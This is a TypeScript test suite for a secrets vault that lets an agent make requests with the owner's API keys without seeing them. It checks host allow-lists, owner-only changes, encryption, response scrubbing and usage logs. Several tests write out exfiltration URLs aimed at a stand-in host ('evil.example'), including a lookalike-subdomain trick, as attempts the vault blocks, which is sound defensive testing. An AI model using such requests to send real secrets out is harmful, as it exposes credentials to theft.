import {afterEach, beforeEach, describe, expect, it} from 'vitest'
import type {Secret} from '#shared/roadmap'
import {Secrets} from '../server/utils/secrets'
import {Store} from '../server/utils/store'
import {testDb} from './db'

const me = {name: 'skoll', owner: true}
const agent = {name: 'claude', owner: false}
const VALUE = 'sk_live_abcdef123456'
let store: Store
let secrets: Secrets
let key: string
let sent: {url: string, init: RequestInit}[]
let answer: (url: string, init: RequestInit) => Response
let lists: Secret[][]

beforeEach(async () => {
    store = new Store(testDb())
    await store.createProject({name: 'larder', key: 'LAR'})
    await store.createProject({name: 'pantry', key: 'PAN'})
    key = 'a long random test key'
    sent = []
    lists = []
    answer = () => new Response('{"ok":true}', {status: 200, headers: {'content-type': 'application/json'}})
    const send = async (url: string | URL | Request, init?: RequestInit) => {
        sent.push({url: String(url), init: init!})
        return answer(String(url), init!)
    }
    secrets = new Secrets(store, () => key, list => lists.push(list), send as typeof fetch)
})

afterEach(() => {
    key = ''
})

/** The status code and message a call fails with. */
async function failure(call: () => unknown): Promise<{status: number, message: string}> {
    try {
        await call()
    } catch (error) {
        const {statusCode, message} = error as {statusCode: number, message: string}
        return {status: statusCode, message}
    }
    throw new Error('it did not fail')
}

const stripe = () => secrets.set('STRIPE_KEY', {value: VALUE, hosts: ['api.stripe.com']}, me)

describe('secrets', () => {
    it('never give their value back, only its last 4 characters', async () => {
        const {secret, created} = await stripe()
        expect(created).toBe(true)
        expect(secret).toMatchObject({name: 'STRIPE_KEY', last4: '3456', hosts: ['api.stripe.com'], projects: null, lastUsed: null})
        const everything = JSON.stringify([await secrets.list(), await secrets.get('STRIPE_KEY'), lists])
        expect(everything).not.toContain(VALUE)
        const row = await store.db.get<{value: string}>('SELECT value FROM secrets')
        expect(row!.value).not.toContain(VALUE)
        expect(row!.value).toMatch(/^v1:/)
    })

    it('are the owner’s to set, narrow and delete', async () => {
        expect((await failure(() => secrets.set('STRIPE_KEY', {value: VALUE, hosts: ['api.stripe.com']}, agent))).status).toBe(403)
        await stripe()
        expect((await failure(() => secrets.narrow('STRIPE_KEY', {hosts: ['api.stripe.com']}, agent))).status).toBe(403)
        expect((await failure(() => secrets.delete('STRIPE_KEY', agent))).status).toBe(403)
    })

    it('check their name, value and hosts', async () => {
        expect((await failure(() => secrets.set('stripe', {value: VALUE, hosts: ['api.stripe.com']}, me))).status).toBe(400)
        expect((await failure(() => secrets.set('SHORT', {value: 'abc', hosts: ['api.stripe.com']}, me))).message).toContain('too short')
        expect((await failure(() => secrets.set('NONE', {value: VALUE, hosts: []}, me))).status).toBe(400)
        expect((await failure(() => secrets.set('BAD', {value: VALUE, hosts: ['not a host']}, me))).status).toBe(400)
        const {secret} = await secrets.set('PASTED', {value: VALUE, hosts: ['https://API.Stripe.com/v1/', 'deploy.lan:8443']}, me)
        expect(secret.hosts).toEqual(['api.stripe.com', 'deploy.lan:8443'])
    })

    it('need ORRERY_SECRET_KEY', async () => {
        key = ''
        const {status, message} = await failure(stripe)
        expect(status).toBe(503)
        expect(message).toContain('ORRERY_SECRET_KEY')
    })

    it("won't open with another key", async () => {
        await stripe()
        key = 'another key'
        const {status, message} = await failure(() => secrets.egress({url: 'https://api.stripe.com/v1/charges', headers: {Authorization: 'Bearer {{secret:STRIPE_KEY}}'}}, agent))
        expect(status).toBe(503)
        expect(message).toContain("won't open")
        expect(sent).toEqual([])
    })

    it('narrow without the value, and widen only with it', async () => {
        await secrets.set('GH', {value: VALUE, hosts: ['api.github.com', 'uploads.github.com']}, me)
        expect((await secrets.narrow('GH', {hosts: ['api.github.com'], projects: ['larder']}, me)).hosts).toEqual(['api.github.com'])
        expect((await failure(() => secrets.narrow('GH', {hosts: ['evil.example']}, me))).status).toBe(403)
        expect((await failure(() => secrets.narrow('GH', {projects: null}, me))).status).toBe(403)
        expect((await failure(() => secrets.narrow('GH', {projects: ['larder', 'pantry']}, me))).status).toBe(403)
        // Still opens after narrowing, sealed to its new hosts.
        await secrets.egress({url: 'https://api.github.com/user', headers: {Authorization: 'token {{secret:GH}}'}, project: 'larder'}, agent)
        expect(sent).toHaveLength(1)
    })

    it("won't open when its hosts are changed in the database", async () => {
        await stripe()
        await store.db.run(`UPDATE secrets SET hosts = '["evil.example"]'`)
        const {status} = await failure(() => secrets.egress({url: 'https://evil.example/steal?k={{secret:STRIPE_KEY}}'}, agent))
        expect(status).toBe(503)
        expect(sent).toEqual([])
    })
})

describe('egress', () => {
    beforeEach(stripe)

    it('fills in the secret and sends it to an allowed host', async () => {
        const result = await secrets.egress({url: 'https://api.stripe.com/v1/charges', method: 'POST', headers: {Authorization: 'Bearer {{secret:STRIPE_KEY}}'}, body: {amount: 100}}, agent)
        expect(result).toMatchObject({status: 200, body: '{"ok":true}', secrets: ['STRIPE_KEY']})
        expect(sent[0]!.url).toBe('https://api.stripe.com/v1/charges')
        expect(sent[0]!.init).toMatchObject({method: 'POST', redirect: 'manual', body: '{"amount":100}', headers: {'Authorization': `Bearer ${VALUE}`, 'Content-Type': 'application/json'}})
    })

    it('refuses any other host, and plain http', async () => {
        const away = await failure(() => secrets.egress({url: 'https://evil.example/?k={{secret:STRIPE_KEY}}'}, agent))
        expect(away.status).toBe(403)
        expect(away.message).toContain('may only go to api.stripe.com')
        expect((await failure(() => secrets.egress({url: 'https://api.stripe.com.evil.example/?k={{secret:STRIPE_KEY}}'}, agent))).status).toBe(403)
        expect((await failure(() => secrets.egress({url: 'http://api.stripe.com/?k={{secret:STRIPE_KEY}}'}, agent))).message).toContain('https')
        expect(sent).toEqual([])
    })

    it('never says the value, even when it was put in the host', async () => {
        const {message} = await failure(() => secrets.egress({url: 'https://{{secret:STRIPE_KEY}}.evil.example/'}, agent))
        expect(message).not.toContain(VALUE)
        expect(message).toContain('{{secret:STRIPE_KEY}}')
    })

    it('only makes requests that use a secret, and only ones that exist', async () => {
        expect((await failure(() => secrets.egress({url: 'https://api.stripe.com/v1/charges'}, agent))).status).toBe(400)
        expect((await failure(() => secrets.egress({url: 'https://api.stripe.com/?k={{secret:NOPE}}'}, agent))).status).toBe(404)
    })

    it('scrubs the value out of what comes back', async () => {
        answer = () => new Response(`echo ${VALUE} ${encodeURIComponent(VALUE)} ${Buffer.from(`${VALUE}:`).toString('base64')}`, {headers: {'x-echo': VALUE, 'set-cookie': 'a=b'}})
        const result = await secrets.egress({url: 'https://api.stripe.com/v1/charges', headers: {Authorization: 'Bearer {{secret:STRIPE_KEY}}'}}, agent)
        expect(JSON.stringify(result)).not.toContain(VALUE)
        expect(result.body).toBe('echo {{secret:STRIPE_KEY}} {{secret:STRIPE_KEY}} {{secret:STRIPE_KEY}}')
        expect(result.headers['x-echo']).toBe('{{secret:STRIPE_KEY}}')
        expect(result.headers['set-cookie']).toBeUndefined()
    })

    it('keeps a secret to its projects', async () => {
        await secrets.set('PANTRY_KEY', {value: VALUE, hosts: ['api.stripe.com'], projects: ['pantry']}, me)
        const request = {url: 'https://api.stripe.com/v1/charges', headers: {Authorization: 'Bearer {{secret:PANTRY_KEY}}'}}
        expect((await failure(() => secrets.egress(request, agent))).status).toBe(403)
        expect((await failure(() => secrets.egress({...request, project: 'larder'}, agent))).status).toBe(403)
        expect((await secrets.egress({...request, project: 'pantry'}, agent)).status).toBe(200)
    })

    it('records each use, without the value', async () => {
        await secrets.egress({url: 'https://api.stripe.com/v1/customers/{{secret:STRIPE_KEY}}', project: 'larder', issue: 'LAR-1'}, agent)
        answer = () => {
            throw new Error(`connect ECONNREFUSED for ${VALUE}`)
        }
        const failed = await failure(() => secrets.egress({url: 'https://api.stripe.com/v1/charges', headers: {Authorization: 'Bearer {{secret:STRIPE_KEY}}'}}, agent))
        expect(failed.status).toBe(502)
        expect(failed.message).not.toContain(VALUE)
        const {uses, lastUsed} = await secrets.get('STRIPE_KEY')
        expect(uses).toMatchObject([
            {method: 'GET', host: 'api.stripe.com', path: '/v1/charges', status: null, error: expect.stringContaining('ECONNREFUSED'), createdBy: 'claude'},
            {method: 'GET', host: 'api.stripe.com', path: '/v1/customers/{{secret:STRIPE_KEY}}', project: 'larder', issue: 'LAR-1', status: 200, error: null},
        ])
        expect(lastUsed).toEqual(uses[0])
        expect(JSON.stringify(uses)).not.toContain(VALUE)
        expect(lists.at(-1)![0]!.lastUsed!.id).toBe(uses[0]!.id)
    })

    it('cuts a long answer', async () => {
        answer = () => new Response('x'.repeat(1_000_010))
        const result = await secrets.egress({url: 'https://api.stripe.com/?k={{secret:STRIPE_KEY}}'}, agent)
        expect(result.truncated).toBe(true)
        expect(result.body).toHaveLength(1_000_000)
    })
})
